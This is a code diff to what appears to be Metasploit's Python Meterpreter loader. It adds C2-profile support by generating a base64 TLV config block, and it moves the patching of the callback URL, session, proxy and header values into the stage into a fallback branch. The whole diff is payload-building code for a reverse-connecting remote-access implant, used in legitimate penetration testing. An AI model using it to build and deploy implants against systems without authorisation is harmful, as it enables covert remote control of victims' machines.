@@ -49,6 +49,35 @@ module Payload::Python::MeterpreterLoader
     Rex::Text.encode_base64(Rex::Text.zlib_deflate(stage_meterpreter(opts)))
   end
 
+  def generate_config(opts={})
+    ds = opts[:datastore] || datastore
+    opts[:uuid] ||= generate_payload_uuid(arch: ARCH_PYTHON, platform: 'python')
+
+    unless opts[:transport_config]
+      scheme = opts[:scheme] || 'tcp'
+      if scheme == 'https'
+        opts[:transport_config] = [transport_config_reverse_https(opts)]
+      elsif scheme == 'http'
+        opts[:transport_config] = [transport_config_reverse_http(opts)]
+      else
+        opts[:transport_config] = [transport_config_reverse_tcp(opts)]
+      end
+    end
+
+    config_opts = {
+      ascii_str:            true,
+      include_comms_handle: false,
+      null_session_guid:    opts[:stageless] == true,
+      expiration:           (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
+      uuid:                 opts[:uuid],
+      transports:           opts[:transport_config],
+      stageless:            opts[:stageless] == true,
+    }.merge(meterpreter_logging_config(opts))
+
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+    config.to_b
+  end
+
   # Get the raw Python Meterpreter stage and patch in values based on the
   # configuration
   #
@@ -86,58 +115,74 @@ module Payload::Python::MeterpreterLoader
 
     met.sub!("# PATCH-SETUP-ENCRYPTION #", python_encryptor_loader)
 
-    met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{ds['SessionExpirationTimeout']}")
-    met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{ds['SessionCommunicationTimeout']}")
-    met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{ds['SessionRetryTotal']}")
-    met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{ds['SessionRetryWait']}")
+    if opts[:c2_profile]
+      # When a C2 profile is specified, generate a TLV config block that
+      # contains the full transport configuration including the profile.
+      unless opts[:url].to_s == ''
+        opts[:scheme] ||= opts[:url].to_s.split(':')[0]
 
-    uuid = opts[:uuid] || generate_payload_uuid(arch: ARCH_PYTHON, platform: 'python')
-    uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
-    met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")
+        # Build a URI from the callback URL for transport config
+        uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
+        opts[:uri] = "#{luri}#{uri}"
+      end
 
-    if opts[:stageless] == true
-      session_guid = '00' * 16
+      config_block = Rex::Text.encode_base64(generate_config(opts))
+      met.sub!("CONFIG_BLOCK = ''", "CONFIG_BLOCK = '#{config_block}'")
     else
-      session_guid = SecureRandom.uuid.gsub('-', '')
-    end
-    met.sub!("SESSION_GUID = \'\'", "SESSION_GUID = \'#{session_guid}\'")
+      # No C2 profile means we do what we used to do and patch the other globals.
+      met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{ds['SessionExpirationTimeout']}")
+      met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{ds['SessionCommunicationTimeout']}")
+      met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{ds['SessionRetryTotal']}")
+      met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{ds['SessionRetryWait']}")
 
-    http_user_agent = opts[:http_user_agent] || ds['HttpUserAgent']
-    http_proxy_host = opts[:http_proxy_host] || ds['HttpProxyHost'] || ds['PROXYHOST']
-    http_proxy_port = opts[:http_proxy_port] || ds['HttpProxyPort'] || ds['PROXYPORT']
-    http_proxy_user = opts[:http_proxy_user] || ds['HttpProxyUser']
-    http_proxy_pass = opts[:http_proxy_pass] || ds['HttpProxyPass']
-    http_header_host = opts[:header_host] || ds['HttpHostHeader']
-    http_header_cookie = opts[:header_cookie] || ds['HttpCookie']
-    http_header_referer = opts[:header_referer] || ds['HttpReferer']
+      uuid = opts[:uuid] || generate_payload_uuid(arch: ARCH_PYTHON, platform: 'python')
+      uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
+      met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")
 
-    # The callback URL can be different to the one that we're receiving from the interface
-    # so we need to generate it
-    # TODO: move this to somewhere more common so that it can be used across payload types
-    unless opts[:url].to_s == ''
+      if opts[:stageless] == true
+        session_guid = '00' * 16
+      else
+        session_guid = SecureRandom.uuid.gsub('-', '')
+      end
+      met.sub!("SESSION_GUID = \'\'", "SESSION_GUID = \'#{session_guid}\'")
 
-      # Build the callback URL (TODO: share this logic with TransportConfig
-      uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
-      opts[:scheme] ||= opts[:url].to_s.split(':')[0]
-      scheme, lhost, lport = transport_uri_components(opts)
-      callback_url = "#{scheme}://#{lhost}:#{lport}#{luri}#{uri}/"
+      http_user_agent = opts[:http_user_agent] || ds['HttpUserAgent']
+      http_proxy_host = opts[:http_proxy_host] || ds['HttpProxyHost'] || ds['PROXYHOST']
+      http_proxy_port = opts[:http_proxy_port] || ds['HttpProxyPort'] || ds['PROXYPORT']
+      http_proxy_user = opts[:http_proxy_user] || ds['HttpProxyUser']
+      http_proxy_pass = opts[:http_proxy_pass] || ds['HttpProxyPass']
+      http_header_host = opts[:header_host] || ds['HttpHostHeader']
+      http_header_cookie = opts[:header_cookie] || ds['HttpCookie']
+      http_header_referer = opts[:header_referer] || ds['HttpReferer']
 
-      # patch in the various payload related configuration
-      met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
-      met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(http_user_agent)}'") if http_user_agent.to_s != ''
-      met.sub!('HTTP_COOKIE = None', "HTTP_COOKIE = '#{var_escape.call(http_header_cookie)}'") if http_header_cookie.to_s != ''
-      met.sub!('HTTP_HOST = None', "HTTP_HOST = '#{var_escape.call(http_header_host)}'") if http_header_host.to_s != ''
-      met.sub!('HTTP_REFERER = None', "HTTP_REFERER = '#{var_escape.call(http_header_referer)}'") if http_header_referer.to_s != ''
+      # The callback URL can be different to the one that we're receiving from the interface
+      # so we need to generate it
+      # TODO: move this to somewhere more common so that it can be used across payload types
+      unless opts[:url].to_s == ''
 
-      if http_proxy_host.to_s != ''
-        http_proxy_url = "http://"
-        unless http_proxy_user.to_s == '' && http_proxy_pass.to_s == ''
-          http_proxy_url << "#{Rex::Text.uri_encode(http_proxy_user)}:#{Rex::Text.uri_encode(http_proxy_pass)}@"
+        # Build the callback URL (TODO: share this logic with TransportConfig
+        uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
+        opts[:scheme] ||= opts[:url].to_s.split(':')[0]
+        scheme, lhost, lport = transport_uri_components(opts)
+        callback_url = "#{scheme}://#{lhost}:#{lport}#{luri}#{uri}/"
+
+        # patch in the various payload related configuration
+        met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
+        met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(http_user_agent)}'") if http_user_agent.to_s != ''
+        met.sub!('HTTP_COOKIE = None', "HTTP_COOKIE = '#{var_escape.call(http_header_cookie)}'") if http_header_cookie.to_s != ''
+        met.sub!('HTTP_HOST = None', "HTTP_HOST = '#{var_escape.call(http_header_host)}'") if http_header_host.to_s != ''
+        met.sub!('HTTP_REFERER = None', "HTTP_REFERER = '#{var_escape.call(http_header_referer)}'") if http_header_referer.to_s != ''
+
+        if http_proxy_host.to_s != ''
+          http_proxy_url = "http://"
+          unless http_proxy_user.to_s == '' && http_proxy_pass.to_s == ''
+            http_proxy_url << "#{Rex::Text.uri_encode(http_proxy_user)}:#{Rex::Text.uri_encode(http_proxy_pass)}@"
+          end
+          http_proxy_url << (Rex::Socket.is_ipv6?(http_proxy_host) ? "[#{http_proxy_host}]" : http_proxy_host)
+          http_proxy_url << ":#{http_proxy_port}"
+
+          met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(http_proxy_url)}'")
         end
-        http_proxy_url << (Rex::Socket.is_ipv6?(http_proxy_host) ? "[#{http_proxy_host}]" : http_proxy_host)
-        http_proxy_url << ":#{http_proxy_port}"
-
-        met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(http_proxy_url)}'")
       end
     end
 
